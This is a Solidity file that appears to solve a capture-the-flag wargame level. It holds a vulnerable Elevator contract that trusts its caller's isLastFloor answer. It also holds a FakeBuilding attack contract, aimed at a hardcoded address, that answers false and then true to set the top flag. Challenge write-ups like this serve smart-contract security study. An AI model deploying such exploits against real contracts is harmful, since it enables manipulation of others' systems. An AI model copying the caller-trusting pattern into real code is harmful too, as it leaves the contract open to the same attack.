// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract FakeBuilding {
    Elevator elevator = Elevator(0x20d9F221dFF98D3A19cCDcD3090591d0df696943);
    bool hasBeenCalledFlag = false;

    function simulateBuildingCall() public {
      elevator.goTo(3);
    }

    //fake is last floor function is called when we call goTo of Elevator
    function isLastFloor(uint fakeArgument) public returns(bool) { //fakeArgument is because elevator uses floor argument

      bool secondCall = hasBeenCalledFlag ? true : false; 
      hasBeenCalledFlag = true;
      return secondCall;
    }

}
